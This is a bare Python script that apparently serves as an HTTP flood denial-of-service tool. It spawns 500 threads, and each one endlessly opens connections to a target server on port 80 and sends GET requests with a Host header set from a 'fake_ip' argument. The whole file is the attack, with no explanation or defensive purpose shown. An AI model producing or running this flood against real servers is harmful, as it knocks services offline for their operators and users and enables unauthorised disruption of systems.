import socket
import threading
import sys 

def main(target,fake_ip):
    port = 80
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()


    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
    attack_num = 0

if __name__ == "__main__":
    main(sys.argv[1],sys.argv[2])

